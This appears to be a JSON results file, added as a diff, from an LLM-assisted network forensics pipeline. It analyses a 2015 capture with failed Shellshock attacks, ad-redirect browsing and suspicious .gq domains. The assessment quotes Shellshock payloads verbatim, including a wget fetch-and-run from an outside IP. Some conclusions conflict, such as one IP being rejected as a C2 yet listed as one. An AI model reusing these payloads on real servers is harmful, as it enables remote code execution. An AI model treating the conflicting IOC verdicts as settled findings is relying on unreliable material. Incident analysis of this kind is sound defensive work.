@@ -1,0 +1,96 @@
+{
+  "_provenance": {
+    "note": "시그니처 제거 ablation(build_evidence --noalert) 행. Kaggle 노트북 stdout 에서 복원.",
+    "commit": "59ed135",
+    "date": "2026-09-09",
+    "case": "q2-noalert",
+    "ablation": "noalert",
+    "model": "qwen3.8:27b",
+    "think": "medium",
+    "num_ctx": 131072,
+    "hardware": "Kaggle T4 x2",
+    "metrics": {
+      "tier1_triage": "http-view level=4, 41,802 chars ≈ 25,797 tokens (budget 32,768)",
+      "triage": "306s — prefill 24,490tok/105s(233tok/s) decode 2,471tok/200s(12.4tok/s) thinking 5,374자 → suspicious",
+      "forensic": "1003s — prefill 26,302tok/114s(231tok/s) decode 11,354tok/887s(12.8tok/s) thinking 18,841자",
+      "run_py_total_s": 1310
+    }
+  },
+  "verdict": "suspicious",
+  "grounds": ["(LLM triage — 시그니처 0건 캡처의 에스컬레이션 판정; 상세 grounds 는 stdout 미출력)"],
+  "pipeline_status": "ok",
+  "_llm_delta": {
+    "verdict_floor": "no_incident",
+    "verdict_full": "suspicious",
+    "iocs_added": ["46.108.156.146", "94.242.254.208"],
+    "iocs_lost": [],
+    "domains_added": ["yjuggczkkq.gq", "gxgfwamxzl.yjuggczkkq.gq", "uugzv.yjuggczkkq.gq", "zzwfbedgue.yjuggczkkq.gq"],
+    "victims_added": [],
+    "_reading": "iocs_added 두 개는 전부 코드 승격기(_iocs_added_from_dns_ip / _iocs_added_dead_beacon) 산물 — LLM 의 기여는 no_incident→suspicious 에스컬레이션으로 승격기를 깨운 것이다. LLM 자력 IOC 발견 0."
+  },
+  "analysis": {
+    "executive_summary": "192.168.0.2(내부 웹서버)에 146.52.78.242·60.250.33.201·66.135.38.206·91.217.90.49·61.240.144.64·98.100.15.218·185.25.151.159 등 7개 외부 IP에서 Shellshock(CVE-2014-6271) 공격이 집중되었으나, 악성 경로 응답이 전부 403/404/0 이고 표기된 C2 콜백(54.248.244.82)으로의 연결 기록이 없어 전부 시도(실패)로 판정. 내부 호스트 192.168.0.53(password-ned-xp)은 0a0a.eu·searchl.org·다수 애드네트워크를 경유하는 광고-리다이렉트 중심 웹 서핑을 보였으며, yjuggczkkq.gq(3개 서브도메인, :39349)에 3회 접속 시도(전부 404)가 포착되었으나 감염 확정 근거(시그니처·C2·실행 신호) 없음. 192.168.0.54(Dell-Dator32)의 213.155.151.152:443 고빈도 연결(112회)은 Google 서비스 정상 트래픽. 내부 호스트 침해(compromised) 확정 사례 없음.",
+    "victims": [
+      {"ip": "192.168.0.2", "status": "unknown", "malware": [], "mac": "ec:f4:bb:4f:c0:d7", "hostname": null, "username": null, "role": null},
+      {"ip": "192.168.0.53", "status": "unknown", "malware": [], "mac": "00:60:6e:00:9d:f9", "hostname": "password-ned-xp", "username": null, "role": null},
+      {"ip": "192.168.0.51", "status": "unknown", "malware": [], "mac": "ec:f4:bb:4f:b2:45", "hostname": "homer-xubuntu", "username": null, "role": null},
+      {"ip": "192.168.0.54", "status": "unknown", "malware": [], "mac": "ec:f4:bb:4f:b0:96", "hostname": "Dell-Dator32", "username": null, "role": null},
+      {"ip": "192.168.0.1", "status": "infrastructure", "malware": [], "mac": "78:54:2e:9f:10:28", "hostname": null, "username": null, "role": "dns_server"}
+    ],
+    "iocs": {
+      "c2": ["46.108.156.146", "94.242.254.208"],
+      "delivery": [],
+      "exfil": [],
+      "domains": ["yjuggczkkq.gq", "gxgfwamxzl.yjuggczkkq.gq", "uugzv.yjuggczkkq.gq", "zzwfbedgue.yjuggczkkq.gq"],
+      "hashes": []
+    },
+    "timeline": [
+      {"ts": 1428537632.400245, "event": "192.168.0.53 → 136.243.24.249(searchl.org) 82회 무DNS 직결 접속 시작 (애드네트워크/검색 리다이렉트)"},
+      {"ts": 1428537727.069534, "event": "192.168.0.53 → 136.243.24.249 랜덤 경로 GET (3건, 200/404)"},
+      {"ts": 1428537749.749841, "event": "192.168.0.53 → 198.37.112.45(0a0a.eu) 상품 페이지 서핑 시작 (index→safety→reviews→ingredients→guarantee→faq)"},
+      {"ts": 1428537754.282769, "event": "내부 → zzwfbedgue.yjuggczkkq.gq:39349 GET 3건 (전부 404, C2/DGA 의심 패턴)"},
+      {"ts": 1428538249.999034, "event": "192.168.0.53 → 136.243.24.249 랜덤 경로 GET 17건 (200, 응답 body base64-형)"},
+      {"ts": 1428542202.513636, "event": "192.168.0.53 → 216.172.61.84(wellnessabout.com) POST (애드 리다이렉트 체인)"},
+      {"ts": 1428545807.145163, "event": "60.250.33.201·66.135.38.206 → 192.168.0.2 Shellshock 페이로드 GET 62건 (200/400/404, 악성 경로 실패)"},
+      {"ts": 1428545853.423641, "event": "66.135.38.206 → 192.168.0.2 /lbin/webcommand.php GET (404)"},
+      {"ts": 1428568438.368226, "event": "146.52.78.242 → 192.168.0.2 HEAD / (200, 프로브)"},
+      {"ts": 1428568439.647752, "event": "146.52.78.242·61.240.144.64·98.100.15.218 → 192.168.0.2 Shellshock + wget 54.248.244.82/s.php (200=루트 페이지, 명령 실패)"},
+      {"ts": 1428568440.217593, "event": "146.52.78.242·98.100.15.218 → 192.168.0.2 /cgi-bin/·/cgi-sys/·/cgi-sys/entropysearch.cgi GET 236건 (0/403/404, 전부 실패)"},
+      {"ts": 1428568444.688086, "event": "146.52.78.242 → 192.168.0.2 /tmUnblock.cgi GET (404)"},
+      {"ts": 1428574692.124516, "event": "application/x-dosexec (446,592 B, sha256 a8ab7f86…) HTTP 다운로드 (PE 1건, 출처 미확인)"},
+      {"ts": 1428602593.806491, "event": "185.25.151.159 → 192.168.0.2 testproxy.php GET (404, 프록시 테스트)"}
+    ],
+    "patient_zero": "unknown",
+    "anomaly_analysis": [
+      "94.242.254.208:80 — 773회 무DNS 직결, 83.4% regularity / 199.8% jitter, 24시간 지속. P2P·파일공유 앱으로 해석되는 패턴(고지터·비정기)이며, 위협 시그니처·실행 신호 부재로 C2로 승격하지 않음",
+      "ff02::1:2(:547)·ff02::c(:1900)·ff02::fb(:5353)·ff02::1:3(:5355) — mDNS/SSDP/LLMNR 등 LAN 멀티캐스트 프로토콜, 100% regularity, 정상",
+      "194.71.144.71:123·188.126.88.9:123 — NTP 동기화(83회, 100% regularity), 정상",
+      "192.168.0.54 → 213.155.151.152:443 112회 — Google 서비스 IP, 24시간 분산(0.001 conn/s), 정상 브라우징",
+      "exfil_candidates: 31.13.64.1(ratio 2.5)·213.155.151.x 계열 — Facebook·Google·YouTube CDN, 대형 서비스로 해석, 유출로 승격 금지",
+      "s.ytimg.com(ratio 2.1) — YouTube 이미지 CDN, 정상",
+      "baseline_suppressed 122건(.pwned.se 접미사·Google·Facebook·adsafeprotected) — Windows DNS 검색 접미사 + 정상 서비스, IOC 아님",
+      "ad_rpc.baseline=true — 워크스테이션→DC 인증 RPC, 정상 도메인 운영",
+      "yjuggczkkq.gq:39349 — 랜덤 서브도메인 + .gq + 비표준 포트, 3개 서브도메인, C2/DGA 인프라 패턴과 부합하나 3회 접속 전부 404로 실패, 감염 확정 불가"
+    ],
+    "assessment": "본 캡처(2015-04-08 ~ 04-09, 24시간)에서 확인된 핵심 보안 이벤트는 192.168.0.2에 대한 Shellshock(CVE-2014-6271) 공격 캠페인이다. 146.52.78.242(805 conn)·60.250.33.201+66.135.38.206(62 req)·91.217.90.49(2 req)·61.240.144.64+98.100.15.218(4 req)·185.25.151.159(1 req)에서 User-Agent에 '() { :; }; wget -qO - http://54.248.244.82/s.php' 또는 '() { :;};/usr/bin/perl' 페이로드를 포함한 요청이 도착했으나, 악성 경로(/cgi-bin/·/cgi-sys/·/tmUnblock.cgi·/lbin/webcommand.php) 응답이 전부 403/404/0 이고, 54.248.244.82로의 아웃바운드 콜백이 캡처에 없어 전부 시도(실패)로 판정. 192.168.0.2는 침해되지 않았으나 Apache/CGI 패치 여부를 확인해야 한다. 192.168.0.53(password-ned-xp)은 0a0a.eu(보충제)·searchl.org(검색)·wellnessabout.com·aboutsporting.com 등 애드-리다이렉트 밀집 사이트를 서핑하고, ib.adnxs.com·pubmatic·doubleclick·adform 등 다수 애드네트워크에 노출되었으나, 이는 사용자 행동(광고-리다이렉트 체인)으로 판단하며 멀웨어 감염으로 확정하지 못함. yjuggczkkq.gq(3 서브도메인, :39349) 접속 3건(404)은 C2/DGA 인프라 패턴과 부합하나 실패에 그침. x-dosexec 파일(446,592 B)이 1건 포착되었으나 위협 시그니처·C2·실행 신호가 없어 악성으로 확정 불가. 커버리지 한계: (1) Suricata 시그니처 0건 — L7 이상(암호화 TLS·DNS-over-HTTPS) 페이로드는 검사 불가, (2) 192.168.0.2의 CGI 실행 로그·프로세스 트리가 캡처에 없어 Shellshock 실패를 100% 배제할 수 없음, (3) x-dosexec 파일의 원출처 URL·다운로드 주체가 HTTP 로그에 명시되지 않아 귀속 불가, (4) 94.242.254.208(773 conn)의 프로토콜이 L4 수준으로만 관측되어 P2P/악성 구별 불가.",
+    "attacks": [
+      {"technique": "exploit_shellshock_cve_2014_6271", "actor": "146.52.78.242", "target": "192.168.0.2", "sample_uri": "/cgi-bin/ /cgi-sys/entropysearch.cgi /tmUnblock.cgi (805 conn, 236 req, 0/403/404)", "disposition": "attempted", "actor_scope": "external", "target_scope": "internal"},
+      {"technique": "exploit_shellshock_cve_2014_6271", "actor": "60.250.33.201", "target": "192.168.0.2", "sample_uri": "95.192.215.175/cgi-bin/bash (62 req, 200/400/404)", "disposition": "attempted", "actor_scope": "external", "target_scope": "internal"},
+      {"technique": "exploit_shellshock_cve_2014_6271", "actor": "66.135.38.206", "target": "192.168.0.2", "sample_uri": "95.192.215.175/lbin/webcommand.php (404)", "disposition": "attempted", "actor_scope": "external", "target_scope": "internal"},
+      {"technique": "exploit_shellshock_cve_2014_6271", "actor": "91.217.90.49", "target": "192.168.0.2", "sample_uri": "95.192.215.175/rom-0 (404)", "disposition": "attempted", "actor_scope": "external", "target_scope": "internal"},
+      {"technique": "exploit_shellshock_cve_2014_6271", "actor": "61.240.144.64", "target": "192.168.0.2", "sample_uri": "192.168.0.2/ (Shellshock UA, 200=루트 페이지)", "disposition": "attempted", "actor_scope": "external", "target_scope": "internal"},
+      {"technique": "exploit_shellshock_cve_2014_6271", "actor": "98.100.15.218", "target": "192.168.0.2", "sample_uri": "192.168.0.2/ (Shellshock UA, 200=루트 페이지)", "disposition": "attempted", "actor_scope": "external", "target_scope": "internal"},
+      {"technique": "recon_proxy_test", "actor": "185.25.151.159", "target": "192.168.0.2", "sample_uri": "testp3.pospr.waw.pl/testproxy.php (404)", "disposition": "attempted", "actor_scope": "external", "target_scope": "internal"}
+    ],
+    "_excluded_benign_hashes": [
+      {"sha256": "6a34b09daeb0eba260faaf911a27e4e0af44313e98931f4a30bf940e5515aaa8", "serving_host": "o.aolcdn.com"},
+      {"sha256": "a8ab7f86c5615c113d8dba4c3b8dbe4a8fad7f2aa0462d2012aabba7383e07e9", "serving_host": "download.gfe.nvidia.com"}
+    ],
+    "_rejected_iocs": [
+      {"kind": "ip", "bucket": "c2", "value": "54.248.244.82", "reason": "evidence 미관측 (오염/환각)"}
+    ],
+    "_iocs_added_from_dns_dom": ["gxgfwamxzl.yjuggczkkq.gq", "uugzv.yjuggczkkq.gq", "zzwfbedgue.yjuggczkkq.gq"],
+    "_iocs_added_from_dns_ip": ["46.108.156.146"],
+    "_iocs_added_dead_beacon": ["94.242.254.208"]
+  }
+}
